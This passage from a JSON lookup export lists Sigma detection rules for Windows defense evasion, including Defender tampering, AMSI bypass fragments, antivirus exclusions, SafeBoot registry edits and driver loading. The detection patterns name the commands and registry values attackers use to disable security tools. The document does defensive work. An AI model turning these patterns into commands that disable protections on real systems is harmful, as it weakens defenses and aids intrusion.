                            "raw": "author: xknow (@xknow_infosec), xorxes (@xor_xes)\ndate: 2019/04/08\ndescription: 'Detects the creation of the PROCEXP152.sys file in the application-data\n  local temporary folder.\n\n  This driver is used by Sysinternals Process Explorer but also by KDU (https://github.com/hfiref0x/KDU)\n  or Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU.\n\n  '\ndetection:\n  condition: selection and not filter\n  filter:\n    Image|contains:\n    - \\procexp64.exe\n    - \\procexp.exe\n    - \\procmon64.exe\n    - \\procmon.exe\n  selection:\n    TargetFilename|contains: \\AppData\\Local\\Temp\\\n    TargetFilename|endswith: PROCEXP152.sys\nfalsepositives:\n- Other legimate tools using this driver and filename (like Sysinternals). Note -\n  Clever attackers may easily bypass this detection by just renaming the driver filename.\n  Therefore just Medium-level and don't rely on it.\nid: 3da70954-0f2c-4103-adff-b7440368f50e\nlevel: medium\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/11/22\nreferences:\n- https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/\nstatus: test\ntags:\n- attack.t1562.001\n- attack.defense_evasion\ntitle: Suspicious PROCEXP152.sys File Created In TMP\n",
                            "sigma:id": "3da70954-0f2c-4103-adff-b7440368f50e",
                            "title": "Suspicious PROCEXP152.sys File Created In TMP",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6c82cf5c-090d-4d57-9188-533577631108",
                        "lookup_data": {
                            "description": "This rule detects a suspicious crash of the Microsoft Malware Protection Engine",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/05/09\ndescription: This rule detects a suspicious crash of the Microsoft Malware Protection\n  Engine\ndetection:\n  condition: 1 of selection* and malware_engine\n  malware_engine:\n    Data|contains|all:\n    - MsMpEng.exe\n    - mpengine.dll\n  selection1:\n    EventID: 1000\n    Provider_Name: Application Error\n  selection2:\n    EventID: 1001\n    Provider_Name: Windows Error Reporting\nfalsepositives:\n- MsMpEng.exe can crash when C:\\ is full\nid: 6c82cf5c-090d-4d57-9188-533577631108\nlevel: high\nlogsource:\n  product: windows\n  service: application\nmodified: 2022/07/12\nreferences:\n- https://bugs.chromium.org/p/project-zero/issues/detail?id=1252&desc=5\n- https://technet.microsoft.com/en-us/library/security/4022344\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1211\n- attack.t1562.001\ntitle: Microsoft Malware Protection Engine Crash\n",
                            "sigma:id": "6c82cf5c-090d-4d57-9188-533577631108",
                            "title": "Microsoft Malware Protection Engine Crash",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "801bd44f-ceed-4eb6-887c-11544633c0aa",
                        "lookup_data": {
                            "description": "Detects suspicious changes to the windows defender configuration",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/12/06\ndescription: Detects suspicious changes to the windows defender configuration\ndetection:\n  condition: selection\n  selection:\n    EventID: 5007\n    NewValue|contains:\n    - '\\Windows Defender\\DisableAntiSpyware '\n    - '\\Windows Defender\\Scan\\DisableRemovableDriveScanning '\n    - '\\Windows Defender\\Scan\\DisableScanningMappedNetworkDrivesForFullScan '\n    - '\\Windows Defender\\SpyNet\\DisableBlockAtFirstSeen '\n    - '\\Real-Time Protection\\SpyNetReporting '\n    - '\\Real-Time Protection\\SubmitSamplesConsent '\nfalsepositives:\n- Administrator activity (must be investigated)\nid: 801bd44f-ceed-4eb6-887c-11544633c0aa\nlevel: high\nlogsource:\n  product: windows\n  service: windefend\nreferences:\n- https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide\n- https://bidouillesecurity.com/disable-windows-defender-in-powershell/#DisableAntiSpyware\nrelated:\n- id: 1321dc4e-a1fe-481d-a016-52c45f0c8b4f\n  type: similar\n- id: a3ab73f1-bd46-4319-8f06-4b20d0617886\n  type: similar\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Windows Defender Suspicious Configuration Changes\n",
                            "sigma:id": "801bd44f-ceed-4eb6-887c-11544633c0aa",
                            "title": "Windows Defender Suspicious Configuration Changes",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f6de9536-0441-4b3f-a646-f4e00f300ffd",
                        "lookup_data": {
                            "description": "Detects scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.",
                            "raw": "author: '@neu5ron'\ndate: 2017/07/30\ndescription: Detects scenario where weak encryption is enabled for a user profile\n  which could be used for hash/password cracking.\ndetection:\n  condition: selection and ((newuac_des and not olduac_des) or (newuac_preauth and\n    not olduac_preauth) or (newuac_encrypted and not olduac_encrypted))\n  newuac_des:\n    NewUacValue|endswith:\n    - 8???\n    - 9???\n    - A???\n    - B???\n    - C???\n    - D???\n    - E???\n    - F???\n  newuac_encrypted:\n    NewUacValue|endswith:\n    - 8??\n    - 9??\n    - A??\n    - B??\n    - C??\n    - D??\n    - E??\n    - F??\n  newuac_preauth:\n    NewUacValue|endswith:\n    - 1????\n    - 3????\n    - 5????\n    - 7????\n    - 9????\n    - B????\n    - D????\n    - F????\n  olduac_des:\n    OldUacValue|endswith:\n    - 8???\n    - 9???\n    - A???\n    - B???\n    - C???\n    - D???\n    - E???\n    - F???\n  olduac_encrypted:\n    OldUacValue|endswith:\n    - 8??\n    - 9??\n    - A??\n    - B??\n    - C??\n    - D??\n    - E??\n    - F??\n  olduac_preauth:\n    OldUacValue|endswith:\n    - 1????\n    - 3????\n    - 5????\n    - 7????\n    - 9????\n    - B????\n    - D????\n    - F????\n  selection:\n    EventID: 4738\nfalsepositives:\n- Unknown\nid: f6de9536-0441-4b3f-a646-f4e00f300ffd\nlevel: high\nlogsource:\n  definition: 'Requirements: Audit Policy : Account Management > Audit User Account\n    Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced\n    Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account\n    Management'\n  product: windows\n  service: security\nmodified: 2021/11/27\nreferences:\n- https://adsecurity.org/?p=2053\n- https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Weak Encryption Enabled and Kerberoast\n",
                            "sigma:id": "f6de9536-0441-4b3f-a646-f4e00f300ffd",
                            "title": "Weak Encryption Enabled and Kerberoast",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8ffc5407-52e3-478f-9596-0a7371eafe13",
                        "lookup_data": {
                            "description": "Detects disabling Windows Defender PUA protection",
                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/08/04\ndescription: Detects disabling Windows Defender PUA protection\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|contains: \\Policies\\Microsoft\\Windows Defender\\PUAProtection\nfalsepositives:\n- Unknown\nid: 8ffc5407-52e3-478f-9596-0a7371eafe13\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/07/04\nreferences:\n- https://www.tenforums.com/tutorials/32236-enable-disable-microsoft-defender-pua-protection-windows-10-a.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disable PUA Protection on Windows Defender\n",
                            "sigma:id": "8ffc5407-52e3-478f-9596-0a7371eafe13",
                            "title": "Disable PUA Protection on Windows Defender",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "14c71865-6cd3-44ae-adaa-1db923fae5f2",
                        "lookup_data": {
                            "description": "Detects powershell scripts attempting to disable scheduled scanning and other parts of windows defender atp or set default actions to allow.",
                            "raw": "author: frack113, elhoim, Tim Shelton (fps, alias support)\ndate: 2022/01/16\ndescription: Detects powershell scripts attempting to disable scheduled scanning and\n  other parts of windows defender atp or set default actions to allow.\ndetection:\n  condition: all of selection_options_disabling* or 1 of selection_other_*\n  selection_options_disabling_function:\n    ScriptBlockText|contains:\n    - DisableRealtimeMonitoring 1\n    - DisableBehaviorMonitoring 1\n    - DisableScriptScanning 1\n    - DisableArchiveScanning 1\n    - DisableBlockAtFirstSeen 1\n    - DisableIOAVProtection 1\n    - DisableIntrusionPreventionSystem 1\n    - DisableRemovableDriveScanning 1\n    - DisableScanningMappedNetworkDrivesForFullScan 1\n    - DisableScanningNetworkFiles 1\n    - DisableRealtimeMonitoring $true\n    - DisableBehaviorMonitoring $true\n    - DisableScriptScanning $true\n    - DisableArchiveScanning $true\n    - DisableBlockAtFirstSeen $true\n    - DisableIOAVProtection $true\n    - DisableIntrusionPreventionSystem $true\n    - DisableRemovableDriveScanning $true\n    - DisableScanningMappedNetworkDrivesForFullScan $true\n    - DisableScanningNetworkFiles $true\n  selection_options_disabling_preference:\n    ScriptBlockText|contains: Set-MpPreference\n  selection_other_default_actions_allow:\n    ScriptBlockText|contains:\n    - LowThreatDefaultAction\n    - ModerateThreatDefaultAction\n    - HighThreatDefaultAction\n    ScriptBlockText|contains|all:\n    - Set-MpPreference\n    - Allow\n  selection_other_use_of_alias:\n    ScriptBlockText|contains:\n    - 'ltdefac '\n    - 'mtdefac '\n    - 'htdefac '\n    - 'stdefac '\nfalsepositives:\n- Legitimate PowerShell scripts\nid: 14c71865-6cd3-44ae-adaa-1db923fae5f2\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/12\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n- https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps\n- https://bidouillesecurity.com/disable-windows-defender-in-powershell/\nrelated:\n- id: ec19ebab-72dc-40e1-9728-4c0b805d722c\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Tamper Windows Defender - ScriptBlockLogging\n",
                            "sigma:id": "14c71865-6cd3-44ae-adaa-1db923fae5f2",
                            "title": "Tamper Windows Defender - ScriptBlockLogging",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f63508a0-c809-4435-b3be-ed819394d612",
                        "lookup_data": {
                            "description": "Detects the usage of the 'SeLoadDriverPrivilege' privilege. This privilege is required to load or unload a device driver.\nWith this privilege, the user can dynamically load and unload device drivers or other code in to kernel mode.\nThis user right does not apply to Plug and Play device drivers.\nIf you exclude privileged users/admins and processes, which are allowed to do so, you are maybe left with bad programs trying to load malicious kernel drivers.\nThis will detect Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs) and the usage of Sysinternals and various other tools. So you have to work with a whitelist to find the bad stuff.\n",
                            "raw": "author: xknow (@xknow_infosec), xorxes (@xor_xes)\ndate: 2019/04/08\ndescription: 'Detects the usage of the ''SeLoadDriverPrivilege'' privilege. This privilege\n  is required to load or unload a device driver.\n\n  With this privilege, the user can dynamically load and unload device drivers or\n  other code in to kernel mode.\n\n  This user right does not apply to Plug and Play device drivers.\n\n  If you exclude privileged users/admins and processes, which are allowed to do so,\n  you are maybe left with bad programs trying to load malicious kernel drivers.\n\n  This will detect Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs)\n  and the usage of Sysinternals and various other tools. So you have to work with\n  a whitelist to find the bad stuff.\n\n  '\ndetection:\n  condition: selection_1 and not 1 of filter_*\n  filter_endswith:\n    ProcessName|endswith:\n    - \\procexp64.exe\n    - \\procexp.exe\n    - \\procmon64.exe\n    - \\procmon.exe\n    - \\Google\\Chrome\\Application\\chrome.exe\n    - \\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\n  filter_exact:\n    ProcessName:\n    - C:\\Windows\\System32\\Dism.exe\n    - C:\\Windows\\System32\\rundll32.exe\n    - C:\\Windows\\System32\\fltMC.exe\n    - C:\\Windows\\HelpPane.exe\n    - C:\\Windows\\System32\\mmc.exe\n    - C:\\Windows\\System32\\svchost.exe\n    - C:\\Windows\\System32\\wimserv.exe\n    - C:\\Windows\\System32\\RuntimeBroker.exe\n    - C:\\Windows\\System32\\SystemSettingsBroker.exe\n    - C:\\Windows\\explorer.exe\n  filter_startswith:\n    ProcessName|startswith: C:\\Program Files\\WindowsApps\\Microsoft\n  selection_1:\n    EventID: 4673\n    PrivilegeList: SeLoadDriverPrivilege\n    Provider_Name: Microsoft-Windows-Security-Auditing\n    Service: '-'\nfalsepositives:\n- Other legimate tools loading drivers. Including but not limited to, Sysinternals,\n  CPU-Z, AVs etc. A baseline needs to be created according to the used products and\n  allowed tools. A good thing to do is to try and exclude users who are allowed to\n  load drivers.\nid: f63508a0-c809-4435-b3be-ed819394d612\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2023/01/20\nreferences:\n- https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4673\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Potential Privileged System Service Operation - SeLoadDriverPrivilege\n",
                            "sigma:id": "f63508a0-c809-4435-b3be-ed819394d612",
                            "title": "Potential Privileged System Service Operation - SeLoadDriverPrivilege",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e0d6c087-2d1c-47fd-8799-3904103c5a98",
                        "lookup_data": {
                            "description": "Detects code fragments found in small and obfuscated AMSI bypass PowerShell scripts",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/11/09\ndescription: Detects code fragments found in small and obfuscated AMSI bypass PowerShell\n  scripts\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - '[Ref].Assembly.GetType'\n    - SetValue($null,$true)\n    - NonPublic,Static\nfalsepositives:\n- Unknown\nid: e0d6c087-2d1c-47fd-8799-3904103c5a98\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n- https://twitter.com/cyb3rops/status/1588574518057979905?s=20&t=A7hh93ONM7ni1Rj1jO5OaA\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\n- attack.execution\ntitle: AMSI Bypass Pattern Assembly GetType\n",
                            "sigma:id": "e0d6c087-2d1c-47fd-8799-3904103c5a98",
                            "title": "AMSI Bypass Pattern Assembly GetType",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "272e55a4-9e6b-4211-acb6-78f51f0b1b40",
                        "lookup_data": {
                            "description": "Detects the removal of folders from the \"ProtectedFolders\" list of of exploit guard. Which could indicate an attacker trying to launch an encryption process",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/05\ndescription: Detects the removal of folders from the \"ProtectedFolders\" list of of\n  exploit guard. Which could indicate an attacker trying to launch an encryption process\ndetection:\n  condition: selection\n  selection:\n    EventType: DeleteValue\n    TargetObject|contains: SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit\n      Guard\\Controlled Folder Access\\ProtectedFolders\nfalsepositives:\n- Legitimate administrators removing applications (should always be monitored)\nid: 272e55a4-9e6b-4211-acb6-78f51f0b1b40\nlevel: high\nlogsource:\n  category: registry_delete\n  product: windows\nreferences:\n- https://www.microsoft.com/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Removal Of Folder From ProtectedFolders In Exploit Guard\n",
                            "sigma:id": "272e55a4-9e6b-4211-acb6-78f51f0b1b40",
                            "title": "Removal Of Folder From ProtectedFolders In Exploit Guard",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "41d1058a-aea7-4952-9293-29eaaf516465",
                        "lookup_data": {
                            "description": "Remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection",
                            "raw": "author: frack113\ndate: 2021/06/07\ndescription: Remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI\n  to disable AMSI inspection\ndetection:\n  condition: selection\n  selection:\n    EventType: DeleteKey\n    TargetObject|endswith:\n    - '{2781761E-28E0-4109-99FE-B9D127C57AFE}'\n    - '{A7C452EF-8E9F-42EB-9F2B-245613CA0DC9}'\nfalsepositives:\n- Unlikely\nid: 41d1058a-aea7-4952-9293-29eaaf516465\nlevel: high\nlogsource:\n  category: registry_delete\n  definition: key must be add to the sysmon configuration to works\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n- https://seclists.org/fulldisclosure/2020/Mar/45\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Removal Of Amsi Provider Reg Key\n",
                            "sigma:id": "41d1058a-aea7-4952-9293-29eaaf516465",
                            "title": "Removal Of Amsi Provider Reg Key",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                        "lookup_data": {
                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1663580963",
                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "93d298a1-d28f-47f1-a468-d971e7796679",
                        "lookup_data": {
                            "description": "Detects disabling Windows Defender Tamper Protection",
                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/08/04\ndescription: Detects disabling Windows Defender Tamper Protection\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_msmpeng_client:\n    Image|endswith: \\MsMpEng.exe\n    Image|startswith: C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\n  filter_msmpeng_domain_controller:\n    Image: C:\\Program Files\\Windows Defender\\MsMpEng.exe\n  selection:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|contains: \\Microsoft\\Windows Defender\\Features\\TamperProtection\nfalsepositives:\n- Unknown\nid: 93d298a1-d28f-47f1-a468-d971e7796679\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/04/21\nreferences:\n- https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-microsoft-defender-antivirus.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disable Tamper Protection on Windows Defender\n",
                            "sigma:id": "93d298a1-d28f-47f1-a468-d971e7796679",
                            "title": "Disable Tamper Protection on Windows Defender",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ae2bdd58-0681-48ac-be7f-58ab4e593458",
                        "lookup_data": {
                            "description": "Detects attempts to remove windows defender configuration using the 'MpPreference' cmdlet",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/05\ndescription: Detects attempts to remove windows defender configuration using the 'MpPreference'\n  cmdlet\ndetection:\n  condition: all of selection_*\n  selection_remove:\n    ScriptBlockText|contains: Remove-MpPreference\n  selection_tamper:\n    ScriptBlockText|contains:\n    - '-ControlledFolderAccessProtectedFolders '\n    - '-AttackSurfaceReductionRules_Ids '\n    - '-AttackSurfaceReductionRules_Actions '\n    - '-CheckForSignaturesBeforeRunningScan '\nfalsepositives:\n- Legitimate PowerShell scripts\nid: ae2bdd58-0681-48ac-be7f-58ab4e593458\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/windows-10-controlled-folder-access-event-search/ba-p/2326088\nrelated:\n- id: 07e3cb2c-0608-410d-be4b-1511cb1a0448\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Tamper Windows Defender Remove-MpPreference - ScriptBlockLogging\n",
                            "sigma:id": "ae2bdd58-0681-48ac-be7f-58ab4e593458",
                            "title": "Tamper Windows Defender Remove-MpPreference - ScriptBlockLogging",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ec19ebab-72dc-40e1-9728-4c0b805d722c",
                        "lookup_data": {
                            "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Or set default actions to allow.",
                            "raw": "author: frack113\ndate: 2021/06/07\ndescription: Attempting to disable scheduled scanning and other parts of windows defender\n  atp. Or set default actions to allow.\ndetection:\n  condition: all of selection_tamper_ps_* or 1 of selection_tamper_other_*\n  selection_tamper_other_alias:\n    HostApplication|contains:\n    - 'ltdefac '\n    - 'mtdefac '\n    - 'htdefac '\n    - 'stdefac '\n  selection_tamper_other_default_actions_allow:\n    HostApplication|contains:\n    - LowThreatDefaultAction\n    - ModerateThreatDefaultAction\n    - HighThreatDefaultAction\n    HostApplication|contains|all:\n    - Set-MpPreference\n    - Allow\n  selection_tamper_ps_action:\n    HostApplication|contains: Set-MpPreference\n  selection_tamper_ps_option:\n    HostApplication|contains:\n    - DisableRealtimeMonitoring 1\n    - DisableBehaviorMonitoring 1\n    - DisableScriptScanning 1\n    - DisableArchiveScanning 1\n    - DisableBlockAtFirstSeen 1\n    - DisableIOAVProtection 1\n    - DisableIntrusionPreventionSystem 1\n    - DisableRemovableDriveScanning 1\n    - DisableScanningMappedNetworkDrivesForFullScan 1\n    - DisableScanningNetworkFiles 1\n    - DisableRealtimeMonitoring $true\n    - DisableBehaviorMonitoring $true\n    - DisableScriptScanning $true\n    - DisableArchiveScanning $true\n    - DisableBlockAtFirstSeen $true\n    - DisableIOAVProtection $true\n    - DisableIntrusionPreventionSystem $true\n    - DisableRemovableDriveScanning $true\n    - DisableScanningMappedNetworkDrivesForFullScan $true\n    - DisableScanningNetworkFiles $true\nfalsepositives:\n- Unknown\nid: ec19ebab-72dc-40e1-9728-4c0b805d722c\nlevel: high\nlogsource:\n  category: ps_classic_provider_start\n  definition: fields have to be extract from event\n  product: windows\nmodified: 2023/01/12\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nrelated:\n- id: ec19ebab-72dc-40e1-9728-4c0b805d722c\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Tamper Windows Defender - PSClassic\n",
                            "sigma:id": "ec19ebab-72dc-40e1-9728-4c0b805d722c",
                            "title": "Tamper Windows Defender - PSClassic",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "17769c90-230e-488b-a463-e05c08e9d48f",
                        "lookup_data": {
                            "description": "Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/04/29\ndescription: Detects requests to exclude files, folders or processes from Antivirus\n  scanning using PowerShell cmdlets\ndetection:\n  condition: all of selection*\n  selection1:\n    CommandLine|contains:\n    - 'Add-MpPreference '\n    - 'Set-MpPreference '\n  selection2:\n    CommandLine|contains:\n    - ' -ExclusionPath '\n    - ' -ExclusionExtension '\n    - ' -ExclusionProcess '\n    - ' -ExclusionIpAddress '\nfalsepositives:\n- Possible Admin Activity\n- Other Cmdlets that may use the same parameters\nid: 17769c90-230e-488b-a463-e05c08e9d48f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/12\nreferences:\n- https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n- https://twitter.com/AdamTheAnalyst/status/1483497517119590403\nrelated:\n- id: c1344fa2-323b-4d2e-9176-84b4d4821c88\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Powershell Defender Exclusion\n",
                            "sigma:id": "17769c90-230e-488b-a463-e05c08e9d48f",
                            "title": "Powershell Defender Exclusion",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d7662ff6-9e97-4596-a61d-9839e32dee8d",
                        "lookup_data": {
                            "description": "Detects execution of \"reg.exe\" commands with the \"add\" or \"copy\" flags on safe boot registry keys. Often used by attacker to allow the ransomware to work in safe mode as some security products do not",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/02\ndescription: Detects execution of \"reg.exe\" commands with the \"add\" or \"copy\" flags\n  on safe boot registry keys. Often used by attacker to allow the ransomware to work\n  in safe mode as some security products do not\ndetection:\n  condition: all of selection*\n  selection_flag:\n    CommandLine|contains:\n    - ' copy '\n    - ' add '\n  selection_img:\n  - Image|endswith: reg.exe\n  - OriginalFileName: reg.exe\n  selection_safeboot:\n    CommandLine|contains: \\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\nfalsepositives:\n- Unlikely\nid: d7662ff6-9e97-4596-a61d-9839e32dee8d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/\nrelated:\n- id: fc0e89b5-adb0-43c1-b749-c12a10ec37de\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Add SafeBoot Keys Via Reg Utility\n",
                            "sigma:id": "d7662ff6-9e97-4596-a61d-9839e32dee8d",
                            "title": "Add SafeBoot Keys Via Reg Utility",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fb50eb7a-5ab1-43ae-bcc9-091818cb8424",
                        "lookup_data": {
                            "description": "Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/06/19\ndescription: Detects command lines that indicate unwanted modifications to registry\n  keys that disable important Internet Explorer security features\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|contains|all:\n    - ' -name IEHarden '\n    - ' -value 0 '\n  selection2:\n    CommandLine|contains|all:\n    - ' -name DEPOff '\n    - ' -value 1 '\n  selection3:\n    CommandLine|contains|all:\n    - ' -name DisableFirstRunCustomize '\n    - ' -value 2 '\nfalsepositives:\n- Unknown, maybe some security software installer disables these features temporarily\nid: fb50eb7a-5ab1-43ae-bcc9-091818cb8424\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disabled IE Security Features\n",
                            "sigma:id": "fb50eb7a-5ab1-43ae-bcc9-091818cb8424",
                            "title": "Disabled IE Security Features",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5e95028c-5229-4214-afae-d653d573d0ec",
                        "lookup_data": {
                            "description": "Detects a suspicious reg.exe invocation that looks as if it would disable an important security service",
                            "raw": "author: Florian Roth (Nextron Systems), John Lambert (idea), elhoim\ndate: 2021/07/14\ndescription: Detects a suspicious reg.exe invocation that looks as if it would disable\n  an important security service\ndetection:\n  condition: selection_reg_add and 1 of selection_cli_*\n  selection_cli_reg_disable_defender:\n    CommandLine|contains:\n    - DisableIOAVProtection\n    - DisableOnAccessProtection\n    - DisableRoutinelyTakingAction\n    - DisableScanOnRealtimeEnable\n    - DisableBlockAtFirstSeen\n    - DisableBehaviorMonitoring\n    - DisableEnhancedNotifications\n    - DisableAntiSpyware\n    - DisableAntiSpywareRealtimeProtection\n    - DisableConfig\n    - DisablePrivacyMode\n    - SignatureDisableUpdateOnStartupWithoutEngine\n    - DisableArchiveScanning\n    - DisableIntrusionPreventionSystem\n    - DisableScriptScanning\n    CommandLine|contains|all:\n    - ' /d 1'\n    - Windows Defender\n  selection_cli_reg_start:\n    CommandLine|contains:\n    - \\Sense\n    - \\WinDefend\n    - \\MsMpSvc\n    - \\NisSrv\n    - \\WdBoot\n    - \\WdNisDrv\n    - \\WdNisSvc\n    - \\wscsvc\n    - \\SecurityHealthService\n    - \\wuauserv\n    - \\UsoSvc\n    - \\WdFilter\n    - \\AppIDSvc\n    CommandLine|contains|all:\n    - ' /d 4'\n    - ' /v Start'\n  selection_reg_add:\n    CommandLine|contains|all:\n    - reg\n    - add\nfalsepositives:\n- Unknown\n- Other security solution installers\nid: 5e95028c-5229-4214-afae-d653d573d0ec\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/05\nreferences:\n- https://twitter.com/JohnLaTwC/status/1415295021041979392\n- https://github.com/gordonbay/Windows-On-Reins/blob/e587ac7a0407847865926d575e3c46f68cf7c68d/wor.ps1\n- https://vms.drweb.fr/virus/?i=24144899\n- https://bidouillesecurity.com/disable-windows-defender-in-powershell/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Reg Disable Security Service\n",
                            "sigma:id": "5e95028c-5229-4214-afae-d653d573d0ec",
                            "title": "Reg Disable Security Service",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0eb46774-f1ab-4a74-8238-1155855f2263",
                        "lookup_data": {
                            "description": "Detects when attackers or tools disable Windows Defender functionalities via the windows registry",
